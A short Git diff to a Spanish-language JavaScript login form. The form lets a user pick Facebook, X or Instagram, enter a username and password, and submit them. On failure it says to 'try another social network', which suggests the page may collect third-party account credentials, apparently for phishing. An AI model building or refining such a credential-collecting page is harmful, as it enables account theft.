@@ -1,6 +1,8 @@
 document.write("JavaScript Funcionando")
-const socials = ['Facebook', 'X', 'instagram'];
+const socials = ['Facebook', 'X', 'Instagram'];
+
 let index = 0;
+updateSocial();
 
 document.getElementById('prev').addEventListener('click', function() {
     event.preventDefault();
@@ -44,7 +46,7 @@ document.getElementById('continue').addEventListener('click', function() {
      */
 
     if (!username || !password || !socialNetwork) {
-        alert('Todos los campos son obligatorios.');
+        errorMessage.textContent = 'Todos los campos son obligatorios.';
         return;
     }
 
@@ -69,7 +71,7 @@ document.getElementById('continue').addEventListener('click', function() {
             if (response.redirected) {
                 window.location.href = response.url;
             } else if (response.status === 401) {
-                errorMessage.textContent = 'Usuario o contraseña incorrectos';
+                errorMessage.textContent = 'Usuario o contraseña incorrectos, pruebe con otra red social';
                 errorMessage.style.display = 'block';
             } else {
                 errorMessage.textContent = 'Uh oh, ocurrió un error, llamen al ingeniero';
